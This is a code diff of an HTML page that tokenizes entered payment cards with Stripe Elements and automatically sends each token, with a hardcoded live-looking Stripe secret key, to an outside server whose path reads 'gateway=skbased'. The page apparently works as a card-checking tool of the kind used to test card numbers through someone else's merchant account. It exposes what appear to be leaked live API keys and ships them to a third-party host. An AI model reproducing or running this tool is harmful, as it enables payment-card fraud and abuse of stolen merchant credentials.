@@ -3,130 +3,87 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Secure Tokenize → Server Process</title>
+<title>Card → Token → API Response</title>
 <script src="https://js.stripe.com/v3/"></script>
 <style>
 :root{
   --bg:#f4f7fb; --card:#fff; --muted:#6b7280;
-  --accent1:#667eea; --accent2:#764ba2;
-  --radius:12px; --shadow:0 12px 30px rgba(17,24,39,0.06);
+  --accent1:#667eea; --accent2:#764ba2; --shadow:0 12px 30px rgba(17,24,39,0.06);
 }
-*{box-sizing:border-box}
-body{margin:0;font-family:Inter,Arial,sans-serif;background:var(--bg);color:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px;}
-.card{width:100%;max-width:720px;background:var(--card);border-radius:16px;box-shadow:var(--shadow);padding:22px;display:grid;grid-template-columns:1fr 360px;gap:18px;}
-.panel{padding:6px 4px;}
-h1{margin:0 0 6px 0;font-size:20px;}
-p.lead{margin:0 0 14px 0;color:var(--muted);font-size:13px;}
-.form-card{background:linear-gradient(180deg,#fff,#fbfdff);border-radius:12px;padding:14px;border:1px solid rgba(99,102,241,0.04);}
-label{display:block;margin-bottom:6px;color:var(--muted);font-size:13px;}
-.stripe-element{padding:12px;border-radius:10px;border:1px solid #e6eef8;background:#fbfdff;}
-.actions{margin-top:12px;display:flex;gap:8px;align-items:center;}
-.btn{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:#fff;border:none;padding:11px 14px;border-radius:10px;font-weight:700;cursor:pointer;}
-.btn.secondary{background:transparent;border:1px solid #e6eef8;color:#0f172a;}
-.btn[disabled]{opacity:0.6;cursor:not-allowed;}
-.right-panel{background:#fff;border-radius:12px;padding:14px;border:1px solid rgba(99,102,241,0.04);height:100%;display:flex;flex-direction:column;}
-.result{margin-top:8px;font-family:monospace;font-size:13px;background:#0f172a;color:#e6eef8;padding:12px;border-radius:8px;overflow:auto;max-height:520px;white-space:pre-wrap;}
-.hint{font-size:12px;color:var(--muted);margin-top:8px;}
-@media(max-width:900px){.card{grid-template-columns:1fr;}}
+body{margin:0;font-family:Inter,Arial,sans-serif;background:var(--bg);display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:24px;}
+.container{display:grid;grid-template-columns:1fr 1fr;gap:20px;width:100%;max-width:900px;}
+.panel{background:var(--card);border-radius:12px;padding:20px;box-shadow:var(--shadow);}
+h2{margin-top:0;font-size:18px;color:#0f172a;}
+.stripe-element{padding:12px;border-radius:10px;border:1px solid #e6eef8;background:#fbfdff;margin-bottom:12px;}
+.result{font-family:monospace;font-size:13px;background:#0f172a;color:#e6eef8;padding:12px;border-radius:8px;overflow:auto;max-height:500px;white-space:pre-wrap;}
 </style>
 </head>
 <body>
-<div class="card" role="main">
+
+<div class="container">
+  <!-- LEFT COLUMN: Token -->
   <div class="panel">
-    <h1>Tokenize card & process (client → server)</h1>
-    <p class="lead">Enter card details below. The card will be tokenized in the browser, then sent to your server API with the SK key.</p>
-    <div class="form-card">
-      <label for="pk">Publishable key (pk_...)</label>
-      <input id="pk" class="stripe-element" placeholder="pk_live_..." />
-      <label for="sk">Secret key (sk_...)</label>
-      <input id="sk" class="stripe-element" placeholder="sk_live_..." />
-      <label style="margin-top:12px;">Card</label>
-      <div id="card-element" class="stripe-element"></div>
-      <div class="actions">
-        <button id="tokenizeBtn" class="btn">Tokenize & Send to API</button>
-        <button id="clearBtn" class="btn secondary" type="button">Clear</button>
-      </div>
-      <div class="hint">Server API: <code>https://phop.onrender.com/gateway=skbased/key=rockysoon</code></div>
-    </div>
+    <h2>Card & Token</h2>
+    <div id="card-element" class="stripe-element"></div>
+    <div id="tokenResult" class="result">Token will appear here...</div>
   </div>
-  <div class="panel right-panel">
-    <div style="font-weight:700;margin-bottom:8px;">Server Response / Debug</div>
-    <div id="result" class="result">Result will appear here after processing...</div>
+
+  <!-- RIGHT COLUMN: API Response -->
+  <div class="panel">
+    <h2>API Response</h2>
+    <div id="apiResult" class="result">Response will appear here...</div>
   </div>
 </div>
 
 <script>
-(async ()=>{
-const API_ENDPOINT_BASE = "https://phop.onrender.com/gateway=skbased/key=rockysoon";
+(async()=>{
+  // ---------------- CONFIG ----------------
+  const STRIPE_PK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";
+  const SERVER_API = "https://phop.onrender.com/gateway=skbased/key=rockysoon";
+  const SECRET_KEY = "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";
 
-const pkInput = document.getElementById('pk');
-const skInput = document.getElementById('sk');
-const tokenizeBtn = document.getElementById('tokenizeBtn');
-const clearBtn = document.getElementById('clearBtn');
-const resultEl = document.getElementById('result');
+  const tokenEl = document.getElementById('tokenResult');
+  const apiEl = document.getElementById('apiResult');
 
-let stripe = null;
-let elements = null;
-let card = null;
+  // ---------------- INIT STRIPE ----------------
+  const stripe = Stripe(STRIPE_PK);
+  const elements = stripe.elements();
+  const card = elements.create('card', {style:{base:{fontSize:'16px',color:'#0f172a','::placeholder':{color:'#6b7280'}},invalid:{color:'#f87171'}}});
+  card.mount('#card-element');
 
-function setResult(text){ resultEl.textContent = text; }
-function setHtmlResult(obj){ resultEl.textContent = JSON.stringify(obj,null,2); }
+  card.on('change', async (event)=>{
+    if(event.complete){
+      tokenEl.textContent = "Generating token...";
+      try{
+        const {token, error} = await stripe.createToken(card);
+        if(error){
+          tokenEl.textContent = "Token error: "+error.message;
+          return;
+        }
+        tokenEl.textContent = token.id;
 
-// Default PK & SK (optional)
-pkInput.value = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";
-skInput.value = "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";
-
-function initStripe(pk){
-  if(card){ card.unmount(); card=null; elements=null; stripe=null; }
-  try{
-    stripe=Stripe(pk);
-    elements=stripe.elements();
-    const style={base:{fontSize:'16px',color:'#0f172a','::placeholder':{color:'#6b7280'}},invalid:{color:'#f87171'}};
-    card=elements.create('card',{style,hidePostalCode:true});
-    card.mount('#card-element');
-    card.on('change',(e)=>{ if(e.error)setResult("Card input error: "+e.error.message); });
-    setResult("Ready — enter card and click Tokenize & Send to API");
-  }catch(err){ setResult("Stripe init error: "+err.message); }
-}
-
-initStripe(pkInput.value.trim());
-
-let pkTimer=null;
-pkInput.addEventListener('input',()=>{
-  clearTimeout(pkTimer);
-  pkTimer=setTimeout(()=>{ const pk=pkInput.value.trim(); if(pk)initStripe(pk); },600);
-});
-
-clearBtn.addEventListener('click',()=>{
-  initStripe(pkInput.value.trim());
-  setResult("Cleared. Ready.");
-});
-
-tokenizeBtn.addEventListener('click',async()=>{
-  tokenizeBtn.disabled=true;
-  setResult("Tokenizing card...");
-
-  if(!stripe||!card){ setResult("Stripe Elements not initialized."); tokenizeBtn.disabled=false; return; }
-
-  const {token,error}=await stripe.createToken(card);
-  if(error){ setResult("Stripe tokenization error:\n"+(error.message||JSON.stringify(error))); tokenizeBtn.disabled=false; return; }
-
-  const sk_key=skInput.value.trim();
-  if(!sk_key){ setResult("Secret key missing."); tokenizeBtn.disabled=false; return; }
-
-  setResult("Token created: "+token.id+"\nSending token + SK key to server...");
-
-  // Send GET request with both token and sk_key
-  try{
-    const url=API_ENDPOINT_BASE+"?token="+encodeURIComponent(token.id)+"&sk_key="+encodeURIComponent(sk_key);
-    const resp=await fetch(url,{method:"GET"});
-    const text=await resp.text();
-    try{ setHtmlResult(JSON.parse(text)); } catch{ setResult(text); }
-  }catch(err){ setResult("Server request failed: "+err); }
-
-  tokenizeBtn.disabled=false;
-});
+        // Send token + secret key to server automatically
+        apiEl.textContent = "Sending to API...";
+        const url = SERVER_API + "?token=" + encodeURIComponent(token.id) + "&sk_key=" + encodeURIComponent(SECRET_KEY);
+        const resp = await fetch(url);
+        const text = await resp.text();
+        try{
+          apiEl.textContent = JSON.stringify(JSON.parse(text), null, 2);
+        }catch{
+          apiEl.textContent = text;
+        }
+      }catch(err){
+        apiEl.textContent = "API request failed: "+err;
+      }
+    }else if(event.error){
+      tokenEl.textContent = "Card input error: "+event.error.message;
+    }else{
+      tokenEl.textContent = "Enter card details...";
+      apiEl.textContent = "Response will appear here...";
+    }
+  });
 })();
 </script>
+
 </body>
 </html>
